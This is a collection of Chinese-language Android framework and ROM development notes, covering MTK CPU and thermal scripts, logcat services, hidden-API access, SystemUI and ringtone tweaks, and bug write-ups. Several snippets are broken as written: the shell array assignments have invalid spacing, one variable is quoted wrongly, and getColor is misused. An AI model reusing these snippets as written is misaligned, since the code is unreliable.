diff --git a/device/mediatek/mt6797/init.mt6797.rc b/device/mediatek/mt6797/init.mt6797.rc
index b3f88cf..85510d9 100755
--- a/device/mediatek/mt6797/init.mt6797.rc
+++ b/device/mediatek/mt6797/init.mt6797.rc
@@ -28,6 +28,9 @@ on init
     # if primary storage is physical, set ro.vold.primary_physical to 1
     # setprop ro.vold.primary_physical 1
 
+    # enable hw_acc default
+    setprop persist.sys.ui.hw true
+
     # BATTERY proc
     chown shell system /proc/mtk_battery_cmd/current_cmd
     chown shell system /proc/mtk_battery_cmd/discharging_cmd

此项配置的目的是实现硬件加速.
```

## 使用jar命令替换jar中的一个或多个文件

```text
android app开发者经常受困于想调用系统hide的api却不能，而常用的方法是反射，本文将介绍一种用系统源码编译出来的class替换相应的api jar中的class文件的方法，正确的添加姿势如下：

首先，要拿到out目录下相应的原始的没有隐藏方法的class文件，以InputManager.class为例，比如我app要调用InputManager的injectInputEvent方法，此方法在google标准api中是隐藏的，因此需要替换使用。

1）先把标准的api中android.jar解压，解压方法用jar或者重命名.zip文件然后解压都可以，找到要替换的class文件的具体名称以及路径。

2）从rom的out/target/common/obj/JAVA_LIBRARIES/framework_intermediates/classes/android/hardware/input目录得到InputManager.class文件，接着需要创建InputManager.class在api中的目录结构，android/hardware/input

3）将api中android.jar和上一步创建的目录放到同级目录。

4）命令行执行：jar -uvf android.jar android/hardware/input/InputManager.class 

大功告成，将此时的android.jar替换掉google标准api中的android.jar即可，从此就可以调用InputManager中隐藏的方法了。
```

## [CMD] 统计重复行出现的次数（重复行消去）shell

```text
awk '{a[$1] ++}END{for(i in a){print i,a[i]  | "sort -r -k 2"}}' testfile

统计testfile中重复行的次数
```

## [CMD] MTK平台控制CPU的脚本

```text
近日负责调整系统性能，对系统做了周身裁剪，包含APP，内核无关配置项，以及无关的so库等。。。

其次，硬件方面，我们使用的是MTK6797硬件平台，进入系统后，发现系统一般只开了一半的核数，而且并非高频运行，因此写了一个脚本来控制cpu的运行状态：

如下：

#!/system/bin/sh

# 0~3 max:1391000
# 4~7 max:1846000
# 8~9 max:2314000

#/sys/devices/system/cpu/cpu6/cpufreq/scaling_available_frequencies
cpu_base=/sys/devices/system/cpu
thermal_base=/sys/class/thermal

high_conf=/system/etc/.tp/.ht120.mtc
def_conf=/system/etc/.tp/thermal.conf
def_conf_bak=$def_conf.syn

function help_list() {
    echo -e "\r"
    echo "#####################################"
    echo "# help (display help list)"
    echo "# max (make all cpu fullspeed)"
    echo "# min (power save mode)"
    echo "# normal (make cpu at normal mode)"
    echo "# state (display cpu info)"
    echo "# thermal (higher thermal config)"
    echo "#####################################"
    echo -e "\r"
}

if [ $# -ne "1" ] ; then
    help_list
    exit 1
fi

if [ $1 = "help" ] ; then
    help_list;
    exit 0
elif [ $1 = "thermal" ] ; then
    if [ -f $def_conf_bak ] ; then
        echo "Already high temp mode"
        exit 0
    fi
echo "================cpu set=================="
    mount -o remount,rw /system

    cp $def_conf $def_conf_bak
    cp $high_conf $def_conf

    mount -o remount,ro /system
elif [ $1 = "max" ] ; then
echo "================cpu set=================="
    for i in `seq 10`
    do
        ((i=$i-1))
#        ((j=$i+4))

#    if [ $i -eq "4" ] ; then
#        echo "0" > $cpu_base/cpu$i/online
#    else
        echo "1" > $cpu_base/cpu$i/online
#        sleep 0.1
#    fi

        MAX_FREQ[$i] =`cat $cpu_base/cpu$i/cpufreq/scaling_available_frequencies | busybox awk -F ' ' '{print $1}'`

#        echo ${MAX_FREQ[$i] }

        echo "performance" > $cpu_base/cpu$i/cpufreq/scaling_governor
        echo "$MAX_FREQ[$i] " > $cpu_base/cpu$i/cpufreq/scaling_setspeed

        if [ $i -le "5" ] ; then
            echo "0" > $cpu_base/cpu$i/online
        fi
        cpu4_state=`cat $cpu_base/cpu4/online`

        if [ $cpu4_state == "1" ] ; then
            echo "0" > $cpu_base/cpu6/online
        fi
    done
elif [ $1 = "min" ] ; then
echo "================cpu set=================="
    for i in `seq 2`
    do
        ((i=$i-1))
        echo "1" > $cpu_base/cpu$i/online
#        sleep 0.01
        echo "powersave" > $cpu_base/cpu$i/cpufreq/scaling_governor
    done

    for j in `seq 8`
    do
        ((j=$j+1))
        echo "0" > $cpu_base/cpu$j/online
#        sleep 0.01
    done
elif [ $1 = "normal" ] ; then
echo "================cpu set=================="
    for i in `seq 5`
    do
        ((i=$i-1))
        echo "1" > $cpu_base/cpu$i/online
        echo "interactive" > $cpu_base/cpu$i/cpufreq/scaling_governor

        ((j=$i+5))
        echo "0" > $cpu_base/cpu$j/online
    done
elif [ $1 = "state" ] ; then
    echo "###############################################"
    for i in `seq 10`
    do
        ((i=$i-1))

        online=`cat $cpu_base/cpu$i/online`
        if [ $online = "1" ] ;then
            echo "cpu $i ON temp:`cat $thermal_base/thermal_zone$i/temp` freq:`cat $cpu_base/cpu$i/cpufreq/scaling_cur_freq` mode:`cat $cpu_base/cpu$i/cpufreq/scaling_governor`"
        else
            echo "cpu $i OFF"
        fi  
        #echo -e "\r"
    done
    echo "###############################################"
    exit 0
else
    help_list
    exit 1
fi

echo "================set finish================"
exit 0

目前max也就是开了四个核，开满了风扇效率不沾的话片子会重启。6797是4个1.4GHz+4个2.0GHz+2个2.4GHz。
```

## [log]  [init] 启动service保存android系统log

```text
作为android开发工程师，出现了BUG是否苦于没有log而苦恼万分呢，以下敝人提供一套自动保存log的方法，供大家借鉴学习：

首先，在产品目录的init.XXX.rc文件中，添加相应的service，

# start log service
 start logd

on property:service.logcat.enable=1
    start logcat_service

on property:service.logcat.enable=0
    stop logcat_service

# log services
service logcat_service /system/bin/logcat -b system -b events -b main -b radio -k -n 10 -v threadtime -r5000 -f /data/Logs/Log.0/logcat.log
    user root
    group log system
    class main
       disabled

service logd /system/bin/sh /system/bin/logd.sh
    user system
    group log
    oneshot

然后，在目标平台的system/bin下添加脚本文件logd.sh，处理存储的log日志，以及设置属性，开启logcat_service,

#!/system/bin/sh

#
# Global folder & cmd params
#

OUTPUT_DIR=/data
LOG=Logs
index=2

LOG_DIR[0] =$OUTPUT_DIR/$LOG/Log.0
LOG_DIR[1] =$OUTPUT_DIR/$LOG/Log.1
LOG_DIR[2] =$OUTPUT_DIR/$LOG/Log.2

RM=rm
MV="mv"
MKDIR=mkdir
UMASK=umask


# set default permission 0775
$UMASK 002

# Init the three folders

i=0
while [ "$i" -le "$index" ] 
do
$MKDIR -p ${LOG_DIR[$i] }
i=$(($i+1))
done

# Transfer the three folders
((i=$index-1))
$RM -r ${LOG_DIR[$index] }/*
while [ "$i" -ge "0" ] 
do
$MV ${LOG_DIR[$i] }/* ${LOG_DIR[$i+1] }
i=$(($i-1))
done
$RM -r ${LOG_DIR[0] }/*

# start logcat service
setprop service.logcat.enable 1

mkdir /data/www
cp -R /system/var/www/    /data/
ln -s /storage/external/ /data/www/sdcard
```

## [反射] Android通过反射获取手机是否有NavigationBar的方法

```text
public static boolean deviceHasNavigationBar() {
    boolean haveNav = false;
    try {
        //1.通过WindowManagerGlobal获取windowManagerService
        // 反射方法：IWindowManager windowManagerService = WindowManagerGlobal.getWindowManagerService();
        Class<?> windowManagerGlobalClass = Class.forName("android.view.WindowManagerGlobal");
        Method getWmServiceMethod = windowManagerGlobalClass.getDeclaredMethod("getWindowManagerService");
        getWmServiceMethod.setAccessible(true);
        //getWindowManagerService是静态方法，所以invoke null
        Object iWindowManager = getWmServiceMethod.invoke(null);

        //2.获取windowMangerService的hasNavigationBar方法返回值
        // 反射方法：haveNav = windowManagerService.hasNavigationBar();
        Class<?> iWindowManagerClass = iWindowManager.getClass();
        Method hasNavBarMethod = iWindowManagerClass.getDeclaredMethod("hasNavigationBar");
        hasNavBarMethod.setAccessible(true);
        haveNav = (Boolean) hasNavBarMethod.invoke(iWindowManager);
    } catch (Exception e) {
        e.printStackTrace();
    }
    return haveNav;
}
```

## android 默认铃音试听时不停循环播放

```text
安桌铃声的循环播放不是系统决定的，而是在铃声文件上面做了
ANDROID_LOOP的标记，而
ringtones文件夹里面的铃声文件一般都有
ANDROID_LOOP的标记，所以不适合直接拿来当短信铃声，需要用千千静听删除其带的
ANDROID_LOOP标记，
做如下处理选择铃声文件右键--文件属性--高级--删除掉
ANDROID_LOOP  true 的字段。

同样
如果想用作来电铃声，而文件本身时长又不足1分钟，就需要到这里来加上
ANDROID_LOOP  true的字段

预置用千千静听修改后的 Ring_Synth_02.ogg 文件之后报错
09-09 15:48:05.716  2750  2843 D ModernMediaScanner: scanItemAudio begin -> file: /product/media/audio/ringtones/Ring_Synth_02.ogg mimeType: audio/ogg
09-09 15:48:05.747   339   390 D PowerHAL: ##Timing deboost
09-09 15:48:05.747   339   390 D PowerHAL: Enter common_subsys_set: enable:0, duration: 0, subsys:cpufreq: 
09-09 15:48:05.765  2750  2843 W ModernMediaScanner: Ignoring troubled file: /product/media/audio/ringtones/Ring_Synth_02.ogg
09-09 15:48:05.765  2750  2843 W ModernMediaScanner: java.io.IOException: java.lang.RuntimeException: setDataSource failed: status = 0x80000000
09-09 15:48:05.765  2750  2843 W ModernMediaScanner:  at com.android.providers.media.scan.ModernMediaScanner.scanItemAudio(ModernMediaScanner.java:700)
09-09 15:48:05.765  2750  2843 W ModernMediaScanner:  at com.android.providers.media.scan.ModernMediaScanner.scanItem(ModernMediaScanner.java:540)
09-09 15:48:05.765  2750  2843 W ModernMediaScanner:  at com.android.providers.media.scan.ModernMediaScanner.access$500(ModernMediaScanner.java:121)
09-09 15:48:05.765  2750  2843 W ModernMediaScanner:  at com.android.providers.media.scan.ModernMediaScanner$Scan.visitFile(ModernMediaScanner.java:431)
09-09 15:48:05.765  2750  2843 W ModernMediaScanner:  at com.android.providers.media.scan.ModernMediaScanner$Scan.visitFile(ModernMediaScanner.java:226)
09-09 15:48:05.765  2750  2843 W ModernMediaScanner:  at java.nio.file.Files.walkFileTree(Files.java:2670)
09-09 15:48:05.765  2750  2843 W ModernMediaScanner:  at java.nio.file.Files.walkFileTree(Files.java:2742)
09-09 15:48:05.765  2750  2843 W ModernMediaScanner:  at com.android.providers.media.scan.ModernMediaScanner$Scan.walkFileTree(ModernMediaScanner.java:286)
09-09 15:48:05.765  2750  2843 W ModernMediaScanner:  at com.android.providers.media.scan.ModernMediaScanner$Scan.run(ModernMediaScanner.java:264)
09-09 15:48:05.765  2750  2843 W ModernMediaScanner:  at com.android.providers.media.scan.ModernMediaScanner.scanDirectory(ModernMediaScanner.java:174)
09-09 15:48:05.765  2750  2843 W ModernMediaScanner:  at com.android.providers.media.MediaService.onScanVolume(MediaService.java:156)
09-09 15:48:05.765  2750  2843 W ModernMediaScanner:  at com.android.providers.media.MediaService.onScanVolume(MediaService.java:135)
09-09 15:48:05.765  2750  2843 W ModernMediaScanner:  at com.android.providers.media.MediaService.onHandleIntent(MediaService.java:89)
09-09 15:48:05.765  2750  2843 W ModernMediaScanner:  at android.app.IntentService$ServiceHandler.handleMessage(IntentService.java:78)
09-09 15:48:05.765  2750  2843 W ModernMediaScanner:  at android.os.Handler.dispatchMessage(Handler.java:107)
09-09 15:48:05.765  2750  2843 W ModernMediaScanner:  at android.os.Looper.loop(Looper.java:214)
09-09 15:48:05.765  2750  2843 W ModernMediaScanner:  at android.os.HandlerThread.run(HandlerThread.java:67)
09-09 15:48:05.765  2750  2843 W ModernMediaScanner: Caused by: java.lang.RuntimeException: setDataSource failed: status = 0x80000000
09-09 15:48:05.765  2750  2843 W ModernMediaScanner:  at android.media.MediaMetadataRetriever.setDataSource(Native Method)
09-09 15:48:05.765  2750  2843 W ModernMediaScanner:  at android.media.MediaMetadataRetriever.setDataSource(MediaMetadataRetriever.java:142)
09-09 15:48:05.765  2750  2843 W ModernMediaScanner:  at com.android.providers.media.scan.ModernMediaScanner.scanItemAudio(ModernMediaScanner.java:665)
09-09 15:48:05.765  2750  2843 W ModernMediaScanner:  ... 16 more
09-09 15:48:05.769  2750  2843 D ModernMediaScanner: processDrmFile -> file is not drm type
09-09 15:48:05.769  2750  2843 D ModernMediaScanner: scanItem -> mimeType: audio/ogg
09-09 15:48:05.769  2750  2843 D ModernMediaScanner: scanItemAudio begin -> file: /product/media/audio/ringtones/Ring_Synth_04.ogg mimeType: audio/ogg
09-09 15:48:05.823  2750  2843 D ModernMediaScanner: withOptionalValue -> key: title value:Flutey Phone
09-09 15:48:05.827  2750  2843 D ModernMediaScanner: withOptionalValue -> key: duration value:3683
09-09 15:48:05.837  2750  2843 D ModernMediaScanner: scanItemAudio end -> file: /product/media/audio/ringtones/Ring_Synth_04.ogg

应该是千千静听把 ogg 文件格式给破坏掉了，导致android系统识别不了

解决方法：
安装 audacity 来修改 ogg 文件中的 metadata 信息
ubuntu:
sudo add-apt-repository ppa:ubuntuhandbook1/audacity
sudo apt-get update
sudo apt-get install audacity

其他系统下可自行百度 audacity

改用 audacity 去修改 ogg 文件，用 audacity 文件打开需要修改的文件，Edit->metadata->Remove(ANDROID_LOOP)->save->File->Export->Export as OGG->choose path->Save->close
```

## [sprd] 展锐miscdata AIDL的使用方法

```text
1.添加 com/sprd/engineermode/IPhaseCheck.aidl 文件，该文件在 vendor/sprd/platform/packages/apps/EngineerMode/src/com/sprd/engineermode/IPhaseCheck.aidl

2.在 Android.mk 中添加 AIDL 的编译规则 LOCAL_SRC_FILES += src/com/sprd/engineermode/IPhaseCheck.aidl

3.绑定服务
IPhaseCheck phaseCheckService;
bindService(new Intent("com.sagereal.intent.action.PHASE_CHECK").setPackage("com.sprd.engineermode"), new ServiceConnection() {
    @Override
    public void onServiceConnected(ComponentName name, IBinder service) {
        phaseCheckService = IPhaseCheck.Stub.asInterface(service);
    }
    @Override
    public void onServiceDisconnected(ComponentName name) {
    }
}, Context.BIND_AUTO_CREATE);

4.调用 writeOffsetString() 方法写数据
phaseCheckService.writeOffsetString(offset, "aaa".getBytes());

5.调用 readOffsetString() 方法读数据
phaseCheckService.readOffsetString(offset, datalength);

6.pull 修改前后的 /dev/block/platform/soc/soc:ap-ahb/20600000.sdio/by-name/miscdata 文件，用 bcompare 比较看是否有差别

7.恢复出场设置之后再 pull /dev/block/platform/soc/soc:ap-ahb/20600000.sdio/by-name/miscdata 文件比较看是否会丢失

其他相关文件:
vendor/sprd/platform/packages/apps/EngineerMode/core/src/main/java/com/unisoc/engineermode/core/impl/hardware/PhaseCheckParse.java

vendor/sprd/tools/phasecheckserver/phasecheckserver.cpp

vendor/sprd/proprietories-source/engpc/modules/libmiscdata/

/sys/class/misc/sprd_7sreset/hard_mode

ro.vendor.product.partitionpath=/dev/block/platform/soc/soc:ap-ahb/20600000.sdio/by-name/

/dev/block/platform/soc/soc:ap-ahb/20600000.sdio/by-name/miscdata
lrwxrwxrwx 1 root root  20 2008-01-01 00:00 miscdata -> /dev/block/mmcblk0p2
```

## Android 鼠标功能

```text
https://blog.csdn.net/sk719887916/article/details/40348853

Android TV长按遥控按键打开鼠标模式
https://blog.csdn.net/zhoumushui/article/details/80089838

功能需求
电视盒子的一般界面只需要遥控即可，但是一些复杂的界面，比如浏览器中的网页，焦点可能没有适配遥控器，这时候如果盒子没有连接鼠标或飞鼠，就没法操作了。可以激活系统的鼠标模式，然后用方向键移动光标，也是一个备选操作。

代码实现
系统本身集成鼠标模式，改变系统属性sys.KeyMouse.mKeyMouseState的值就可以设置鼠标模式的开关。只需要改动PhoneWindowManager即可：

// frameworks/base/services/core/java/com/android/server/policy/PhoneWindowManager.java
添加长按事件监听，监听长按返回键的动作：

else if (keyCode == KeyEvent.KEYCODE_BACK) {
   if (down && repeatCount == 0) {
   } else if((event.getFlags() & KeyEvent.FLAG_LONG_PRESS) != 0) {
       mHandler.postDelayed(MouseRunable, 100);
       return -1;
   }
}
长按后改变sys.KeyMouse.mKeyMouseStat系统状态的属性：

Runnable MouseRunable = new Runnable(){
     public void run() {
         mstate = SystemProperties.get("sys.KeyMouse.mKeyMouseState");
         if(mstate.equals("on")) {
             SystemProperties.set("sys.KeyMouse.mKeyMouseState", "off");
             Toast.makeText(mContext, "Diable mouse mode.", Toast.LENGTH_LONG).show();
         } else {
             SystemProperties.set("sys.KeyMouse.mKeyMouseState", "on");
             Toast.makeText(mContext, "Enable mouse mode,long press again to disable.", Toast.LENGTH_LONG).show();
         }
     }
};
这样就实现了长按遥控上的返回键，来开启和关闭鼠标模式了。

TODO : sys.KeyMouse.mKeyMouseState 这个东西是他们自己系统里面客制化的吧??

TODO : 如何通过jni调用鼠标???    https://blog.csdn.net/tkwxty/article/details/41023491
TODO : OTG的鼠标是怎么实现的????
```

## [sysui] AndroidQ SystemUI之插件化机制Plugin

```text
https://blog.csdn.net/qq_34211365/article/details/104395735
```

## [sysui] 修改NavigationBar ‘back’ 触控范围

```text
SystemUI/src/com/android/systemui/statusbar/phone/NearestTouchFrame.java
@VisibleForTesting
NearestTouchFrame(Context context, AttributeSet attrs, Configuration c) {
    super(context, attrs);
    //mIsActive = c.smallestScreenWidthDp < 600;
    mIsActive = false
}
```

## [sysui] Android 隐藏 SystemUI 全屏显示

```text
第一种方法：
修改：frameworks/base/core/res/res/values/dimens.xml 把下面这些值都修改成0即可，编译验证。

<resources>
    // 省略部分
    <!-- Height of the status bar -->
    <dimen name="status_bar_height">0dip</dimen>
    <!-- Height of the bottom navigation / system bar. -->
    <dimen name="navigation_bar_height">0dp</dimen>
    <!-- Height of the bottom navigation bar in portrait; often the same as @dimen/navigation_bar_height -->
    <dimen name="navigation_bar_height_landscape">0dp</dimen>
    <!-- Width of the navigation bar when it is placed vertically on the screen -->
    <dimen name="navigation_bar_width">0dp</dimen>
    <!-- Height of notification icons in the status bar -->
    <dimen name="status_bar_icon_size">0dip</dimen>
    <!-- Size of the giant number (unread count) in the notifications -->
    <dimen name="status_bar_content_number_size">0sp</dimen>
    //省略部分
</resources>

第二种方法：
修改frameworks/base/packages/SystemUI/src/com/android/systemui/statusbar/tablet/TabletStatusBar.java

private void addStatusBarWindow() {
    final View sb = makeStatusBarView();

    final WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.TYPE_NAVIGATION_BAR,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                | WindowManager.LayoutParams.FLAG_TOUCHABLE_WHEN_WAKING
                | WindowManager.LayoutParams.FLAG_SPLIT_TOUCH,
            PixelFormat.OPAQUE);

    // We explicitly leave FLAG_HARDWARE_ACCELERATED out of the flags.  The status bar occupies
    // very little screen real-estate and is updated fairly frequently.  By using CPU rendering
    // for the status bar, we prevent the GPU from having to wake up just to do these small
    // updates, which should help keep power consumption down.

    lp.gravity = getStatusBarGravity();
    lp.setTitle("SystemBar");
    lp.packageName = mContext.getPackageName();
    // 注释掉下面这行即可隐藏SystemUI，全屏显示
    //mWindowManager.addView(sb, lp);
}
```

## [CMD] 查看文件类型

```text
adb shell ls -lZ

dr-xr-xr-x  69 root   root   u:object_r:cgroup:s0               0 1970-01-01 08:00 acct
drwxr-xr-x  14 root   root   u:object_r:apex_mnt_dir:s0       280 1970-01-01 08:00 apex
lrw-r--r--   1 root   root   u:object_r:rootfs:s0              11 2020-09-21 13:32 bin -> /system/bin
lrw-r--r--   1 root   root   u:object_r:rootfs:s0              50 2020-09-21 13:32 bugreports -> /data/user_de/0/com.android.shell/files/bugreports
drwxrwx---   7 system cache  u:object_r:cache_file:s0        4096 1970-01-01 08:00 cache
lrw-r--r--   1 root   root   u:object_r:rootfs:s0              19 2020-09-21 13:32 charger -> /system/bin/charger
drwxr-xr-x   4 root   root   u:object_r:configfs:s0             0 1970-01-01 08:00 config
lrw-r--r--   1 root   root   u:object_r:rootfs:s0              17 2020-09-21 13:32 d -> /sys/kernel/debug
drwxrwx--x  48 system system u:object_r:system_data_file:s0  4096 1970-01-01 08:00 data
drwxr-xr-x   2 root   root   u:object_r:tmpfs:s0             4096 2020-09-19 15:38 debug_ramdisk
lrw-------   1 root   root   u:object_r:rootfs:s0              23 2020-09-21 13:32 default.prop -> system/etc/prop.default
drwxr-xr-x  19 root   root   u:object_r:device:s0            5040 1970-01-01 08:00 dev
lrw-r--r--   1 root   root   u:object_r:rootfs:s0              11 2020-09-21 13:32 etc -> /system/etc
lrwxr-x---   1 root   shell  u:object_r:init_exec:s0           16 2020-09-21 13:32 init -> /system/bin/init
-rwxr-x---   1 root   shell  u:object_r:rootfs:s0            1825 2020-09-19 15:38 init.environ.rc
-rwxr-x---   1 root   shell  u:object_r:rootfs:s0           33014 2020-09-19 16:18 init.rc
-rwxr-x---   1 root   shell  u:object_r:rootfs:s0           17933 2020-09-19 16:18 init.recovery.common.rc
-rwxr-x---   1 root   shell  u:object_r:rootfs:s0              73 2020-09-19 16:18 init.recovery.sp9832e_1h10_go.rc
-rwxr-x---   1 root   shell  u:object_r:rootfs:s0            7690 2020-09-19 16:18 init.usb.configfs.rc
-rwxr-x---   1 root   shell  u:object_r:rootfs:s0            5649 2020-09-19 16:18 init.usb.rc
-rwxr-x---   1 root   shell  u:object_r:rootfs:s0             563 2020-09-19 16:18 init.zygote32.rc
drwx------   2 root   root   u:object_r:rootfs:s0           16384 2020-09-21 13:32 lost+found
drwxr-xr-x   7 root   root   u:object_r:metadata_file:s0     4096 1970-01-01 08:00 metadata
drwxr-xr-x  13 root   system u:object_r:tmpfs:s0              300 2020-01-03 02:00 mnt
drwxr-xr-x   2 root   root   u:object_r:vendor_file:s0       4096 2020-09-19 15:38 odm
drwxr-xr-x   2 root   root   u:object_r:oemfs:s0             4096 2020-09-19 15:38 oem
dr-xr-xr-x 372 root   root   u:object_r:proc:s0                 0 1970-01-01 08:00 proc
drwxr-xr-x   1 root   root   u:object_r:system_file:s0       3488 2020-01-03 02:00 product
lrw-r--r--   1 root   root   u:object_r:system_file:s0         24 2020-09-21 13:32 product_services -> /system/product_services
drwxr-x---   2 root   shell  u:object_r:rootfs:s0            4096 2020-09-19 16:18 sbin
lrw-r--r--   1 root   root   u:object_r:rootfs:s0              21 2020-09-21 13:32 sdcard -> /storage/self/primary
drwxr-xr-x   4 root   root   u:object_r:storage_file:s0        80 2020-01-03 02:00 storage
dr-xr-xr-x  12 root   root   u:object_r:sysfs:s0                0 1970-01-01 08:00 sys
drwxr-xr-x   1 root   root   u:object_r:system_file:s0       3488 2020-01-03 02:00 system
-rw-r--r--   1 root   root   u:object_r:rootfs:s0            2608 2020-09-19 15:38 ueventd.rc
drwxr-xr-x   1 root   root   u:object_r:vendor_file:s0       3488 2020-01-03 02:00 vendor
```

## [知识点] so

```text
shared object。可运行的二进制码
```

## apk字体大小跟着系统字体大小变化的问题处理

```text
今天碰到一个问题，写好了一个apk，当我修改了手机系统的字体大小，发现apk里面的字体都跟着变了。原来从android4.0开始，android系统就提供了修改字体的大小功能（看来我知道的太晚了。。。），如果代码里面不做修改的话，一修改大小界面就会变的面目全非了。。。

修改方法如下：

@Override
public Resources getResources() {  
    Resources res = super.getResources();    
    Configuration config = new Configuration();    
    config.setToDefaults();    
    res.updateConfiguration(config,res.getDisplayMetrics());  
    return res;  
} 
在activity的基类里面重写这个方法，就ok了。
```

## [性能] 不要将 Button 的背景设置成 selector

```text
如果将 Button的背景设置成 selector，在初始化Button的时候会将正反选图片都加载在内存中，相当于一个按钮占用了两张相同大小图片所使用的内存
可以通过在布局文件中给按钮设置正常状态下的背景图片，然后在代码中监听按钮的点击状态，当按下按钮时为按钮设置反选效果的图片，抬起时重新设置为正常状态下的背景
ImageButton personalInfoBtn = (ImageButton) findViewById(R.id.personalInfoBtn);
personalInfoBtn.setOnTouchListener(new OnTouchListener() {
 @SuppressLint("ClickableViewAccessibility")
 @Override
 public boolean onTouch(View v, MotionEvent event) {
  int action = event.getAction();
  if (action == MotionEvent.ACTION_DOWN) {
   ((ImageButton) v).setColorFilter(getResources().getColor(0x50000000));
  } else if (action == MotionEvent.ACTION_UP || action == MotionEvent.ACTION_CANCEL) {
   ((ImageButton) v).clearColorFilter();
  }
  // 为了不影响监听按钮的 onClick回调，返回值为false
  return false;
 }
});
```

## [性能]

```text
手机厂商由于有代码权限, 所以可以采集到更多的数据, 比如 Kernel 相关的数据 : cpu 负载 \ io 负载 \ Memory 负载 \ FSync \ 异常监控 \ 温度监控 \ 存储大小监控 等 , 每一个大项又都有几十个小项 . 所以可以监控的数据会非常多 , 遇到问题也可以从多个技术指标去分析 . 这就需要在这方面经验非常丰富的团队 , 去定义这些监控指标 , 确定最终要收集那些信息 , 收集上来的数据如何去分析等.

至于后续的优化工作, 就考验各个厂商的研发能力了, 正如伟琳在这篇文章:那些年，我们一起经历过的 Android 系统性能优化 所说 , 目前能力比较强的手机厂商 , 都在底层各个模块 , 结合硬件做优化 , 因为归根结底都是资源的分配; 而一些研发实力不是很强的厂商, 则重点还是围绕在根据场景分配资源.
```

## [bug] 连续插拔usb播放音效之后不会播放

```text
01-03 08:49:11.478   431  1506 E AudioFlinger: not enough memory for AudioTrack size=65760
01-03 08:49:11.479   431  1506 E AudioFlinger_Threads: createTrack_l() initCheck failed -12; no control block?
01-03 08:49:11.479   440  3271 E AudioTrack: AudioFlinger could not create track, status: -12
01-03 08:49:11.480   440  3271 E AudioSink: Unable to create audio track
01-03 08:49:11.480   440  3271 W NuPlayerRenderer: openAudioSink: non offloaded open failed status: -19
01-03 08:49:11.480   440  3271 W NuPlayerRenderer: onDrainAudioQueue(): audio sink is not ready
01-03 08:49:11.480   440  3272 E NuPlayerDecoder: Renderer reported 0xffffffed when changing audio output format
01-03 08:49:11.480   440  3271 W NuPlayerRenderer: onDrainAudioQueue(): audio sink is not ready
01-03 08:49:11.480   440  3268 E NuPlayer: received error(0xffffffed) from audio decoder, flushing(0), now shutting down
01-03 08:49:11.481  1131  1383 E MediaPlayerNative: error (1, -19)
01-03 08:49:11.483  1131  1131 E MediaPlayer: Error (1,-19)
01-03 08:49:11.485  1013  1118 I AudioService: setForceUse(FOR_MEDIA, FORCE_NO_BT_A2DP) due to setBluetoothA2dpOn(false) from u/pid:1000/1013

可能是播放铃声之后没有及时释放导致内存泄漏
https://github.com/google/ExoPlayer/issues/954

Ringtone ringtone;
ringtone.play();
什么时候释放比较好呢?

最终是因为对应的音频文件没有编译进去导致的
```

## [bug] 高温报警代码中修改字符串不起效果

```text
//查看 alps/vendor/mediatek/proprietary/packages/apps/BatteryWarning/Android.mk 文件发现有两种编译方式，一种是把编译好的apk直接编译到系统中，另外一种是通过源码编译apk
LOCAL_PATH:= $(call my-dir)
include $(CLEAR_VARS)

MY_BUILD_PORTABLE := yes        # 这里默认是 yes，所以

ifeq ($(strip $(MY_BUILD_PORTABLE)),yes)
# Module name should match apk name to be installed
LOCAL_MODULE := BatteryWarning
LOCAL_MODULE_TAGS := optional
LOCAL_SRC_FILES := $(LOCAL_MODULE)-release-unsigned.apk
LOCAL_MODULE_CLASS := APPS
LOCAL_MODULE_SUFFIX := $(COMMON_ANDROID_PACKAGE_SUFFIX)
LOCAL_CERTIFICATE := platform

LOCAL_PROPRIETARY_MODULE := false
LOCAL_MODULE_OWNER := mtk
include $(BUILD_PREBUILT)
else
LOCAL_JAVA_LIBRARIES := bouncycastle

LOCAL_MODULE_TAGS := optional

LOCAL_SRC_FILES := $(call all-java-files-under, src)

LOCAL_PACKAGE_NAME := BatteryWarning
LOCAL_PROPRIETARY_MODULE := false
LOCAL_MODULE_OWNER := mtk
LOCAL_CERTIFICATE := platform

include $(BUILD_PACKAGE)
endif

# Use the following include to make our test apk.
include $(call all-makefiles-under,$(LOCAL_PATH))

这里的 MY_BUILD_PORTABLE 默认为 yes，所以会默认编译已经编译好的apk，所以怎么修改字符串都不会起作用

修改方案：
MY_BUILD_PORTABLE 修改为 no 即可
```

## Android之印度拨号音

```text
frameworks/av/media/libmedia/ToneGenerator.cpp
{ segments: { { duration: ToneGenerator::TONEGEN_INF, waveFreq: { 425, 450, 0 }, 0, 0 }, 
              { duration: 0 , waveFreq: { 0 }, 0, 0}},
  repeatCnt: ToneGenerator::TONEGEN_INF,
  repeatSegment: 0 },                              // TONE_SUP_DIAL  [400,425]  [450,425]  [425,450]  四种都可以
```

## Android之添加充电断开提示音

```text
frameworks/base/services/core/java/com/android/server/power/Notifier.java

private static final int MSG_WIRED_CHARGING_STARTED = 6;
private static final int MSG_WIRED_CHARGING_STOPED = 7;

public void onWiredChargingStoped(@UserIdInt int userId) {
     mSuspendBlocker.acquire();
     Message msg = mHandler.obtainMessage(MSG_WIRED_CHARGING_STOPED);
     msg.setAsynchronous(true);
     msg.arg1 = userId;
     mHandler.sendMessage(msg);
}

private void showWiredChargingStoped(@UserIdInt int userId) {
    playChargingStartedFeedback(userId);
    mSuspendBlocker.release();
}

private final class NotifierHandler extends Handler {
    public NotifierHandler(Looper looper) {
        super(looper, null, true /*async*/);
    }
    @Override
    public void handleMessage(Message msg) {
        switch (msg.what) {
            ... // 
            case MSG_WIRED_CHARGING_STARTED:
                showWiredChargingStarted(msg.arg1);
                break;
            case MSG_WIRED_CHARGING_STOPED:
             showWiredChargingStoped(msg.arg1);
             break;
        }
    }
}

frameworks/base/services/core/java/com/android/server/power/PowerManagerService.java
private void updateIsPoweredLocked(int dirty) {
    .... //
            // only play charging sounds if boot is completed so charging sounds don't play
            // with potential notification sounds
            if (mBootCompleted) {
                if (mIsPowered && !BatteryManager.isPlugWired(oldPlugType)
                        && BatteryManager.isPlugWired(mPlugType)) {
                    mNotifier.onWiredChargingStarted(mForegroundProfile);
                } else if (dockedOnWirelessCharger) {
                    mNotifier.onWirelessChargingStarted(mBatteryLevel, mForegroundProfile);
                }else if(!mIsPowered) {
                 mNotifier.onWiredChargingStoped(mForegroundProfile); // TODO 
                }
            }
        }
